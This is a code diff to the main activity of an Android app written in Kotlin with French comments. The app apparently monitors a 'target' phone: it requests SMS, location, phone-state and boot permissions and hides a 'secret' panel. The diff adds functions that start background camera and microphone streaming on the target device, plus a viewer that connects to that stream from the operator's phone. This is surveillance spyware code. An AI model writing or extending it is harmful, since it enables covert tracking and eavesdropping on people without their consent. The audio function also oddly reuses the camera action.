@@ -30,8 +30,9 @@ class MainActivity : AppCompatActivity() {
     private lateinit var btnSuivi: Button
     private lateinit var btnStopGps: Button
     private lateinit var layoutSecret: LinearLayout
-    private lateinit var btnCamera: Button
-    private lateinit var btnAudio: Button
+    private lateinit var btnActiverCamera: Button
+    private lateinit var btnActiverAudio: Button
+    private lateinit var btnVoirFlux: Button
     private lateinit var btnStopStream: Button
     private lateinit var mapView: MapView
     private lateinit var tvStatut: TextView
@@ -53,6 +54,7 @@ class MainActivity : AppCompatActivity() {
         Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION,
         Manifest.permission.SEND_SMS, Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS,
         Manifest.permission.READ_PHONE_STATE, Manifest.permission.FOREGROUND_SERVICE,
+        Manifest.permission.FOREGROUND_SERVICE_LOCATION,
         Manifest.permission.POST_NOTIFICATIONS, Manifest.permission.RECEIVE_BOOT_COMPLETED
     ).apply { 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) add(Manifest.permission.POST_NOTIFICATIONS)
@@ -86,8 +88,9 @@ class MainActivity : AppCompatActivity() {
         btnSuivi = findViewById(R.id.btnSuivi)
         btnStopGps = findViewById(R.id.btnStopGps)
         layoutSecret = findViewById(R.id.layoutSecret)
-        btnCamera = findViewById(R.id.btnCamera)
-        btnAudio = findViewById(R.id.btnAudio)
+        btnActiverCamera = findViewById(R.id.btnActiverCamera)
+        btnActiverAudio = findViewById(R.id.btnActiverAudio)
+        btnVoirFlux = findViewById(R.id.btnVoirFlux)
         btnStopStream = findViewById(R.id.btnStopStream)
         mapView = findViewById(R.id.mapView)
         tvStatut = findViewById(R.id.tvStatut)
@@ -111,11 +114,54 @@ class MainActivity : AppCompatActivity() {
         btnPosition.setOnClickListener { demanderPosition() }
         btnSuivi.setOnClickListener { demarrerSuivi() }
         btnStopGps.setOnClickListener { arreterSuivi() }
-        btnCamera.setOnClickListener { demanderCamera() }
-        btnAudio.setOnClickListener { demanderAudio() }
+        
+        // ⚡ SUR LE TELEPHONE CIBLE : il ACTIVE sa caméra/micro
+        btnActiverCamera.setOnClickListener { activerCameraIci() }
+        btnActiverAudio.setOnClickListener { activerAudioIci() }
+        
+        // ⚡ SUR TON TELEPHONE : tu TE CONNECTES à son flux
+        btnVoirFlux.setOnClickListener { voirFlux() }
+        
         btnStopStream.setOnClickListener { arreterStream() }
 
         layoutSecret.visibility = View.GONE
+    }
+
+    private fun activerCameraIci() {
+        if (!verifierPermissionsCameraAudio()) return
+        val intent = Intent(this, PermanentStreamService::class.java)
+        intent.action = PermanentStreamService.ACTION_DEMARRER_CAMERA
+        startForegroundServiceSafe(intent)
+        journal("📷 CAMERA ACTIVE sur CE telephone — En attente de connexion...")
+        Toast.makeText(this, "✅ Camera active ! Laisse tourner en arriere-plan", Toast.LENGTH_LONG).show()
+    }
+
+    private fun activerAudioIci() {
+        if (!verifierPermissionsCameraAudio()) return
+        val intent = Intent(this, PermanentStreamService::class.java)
+        intent.action = PermanentStreamService.ACTION_DEMARRER_CAMERA
+        startForegroundServiceSafe(intent)
+        journal("🔊 AUDIO ACTIF sur CE telephone — En attente de connexion...")
+        Toast.makeText(this, "✅ Micro actif ! Laisse tourner en arriere-plan", Toast.LENGTH_LONG).show()
+    }
+
+    private fun voirFlux() {
+        if (!numeroValide()) return
+        val intent = Intent(this, PermanentStreamService::class.java)
+        intent.action = PermanentStreamService.ACTION_DEMARRER_RECEPTION
+        startForegroundServiceSafe(intent)
+        journal("👁️ Connexion au flux de $numeroCible...")
+        Toast.makeText(this, "✅ Connexion en cours... Attends quelques secondes", Toast.LENGTH_LONG).show()
+    }
+
+    private fun verifierPermissionsCameraAudio(): Boolean {
+        val cam = ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
+        val mic = ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
+        if (!cam || !mic) {
+            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO), 1002)
+            return false
+        }
+        return true
     }
 
     private fun recupererMonNumero() {
@@ -133,7 +179,6 @@ class MainActivity : AppCompatActivity() {
             return false
         }
         numeroCible = normaliser(brut)
-        // ✅ PLUS DE RESTRICTION — Tu peux mettre ton propre numero !
         return true
     }
 
@@ -158,30 +203,12 @@ class MainActivity : AppCompatActivity() {
         Toast.makeText(this, "✅ Suivi arrete", Toast.LENGTH_SHORT).show()
     }
 
-    private fun demanderCamera() {
-        if (!numeroValide()) return
-        val intent = Intent(this, PermanentStreamService::class.java)
-        intent.action = PermanentStreamService.ACTION_DEMARRER_RECEPTION
-        startForegroundServiceSafe(intent)
-        journal("📷 Camera demande a $numeroCible")
-        Toast.makeText(this, "✅ Connexion camera...", Toast.LENGTH_SHORT).show()
-    }
-
-    private fun demanderAudio() {
-        if (!numeroValide()) return
-        val intent = Intent(this, PermanentStreamService::class.java)
-        intent.action = PermanentStreamService.ACTION_DEMARRER_RECEPTION
-        startForegroundServiceSafe(intent)
-        journal("🔊 Audio demande a $numeroCible")
-        Toast.makeText(this, "✅ Ecoute en cours...", Toast.LENGTH_SHORT).show()
-    }
-
     private fun arreterStream() {
         val intent = Intent(this, PermanentStreamService::class.java)
         intent.action = PermanentStreamService.ACTION_ARRETER
         startForegroundServiceSafe(intent)
         journal("⏹️ Streaming arrete")
-        Toast.makeText(this, "✅ Stream arrete", Toast.LENGTH_SHORT).show()
+        Toast.makeText(this, "✅ Tout arrete", Toast.LENGTH_SHORT).show()
     }
 
     private fun envoyerCommande(commande: String) {
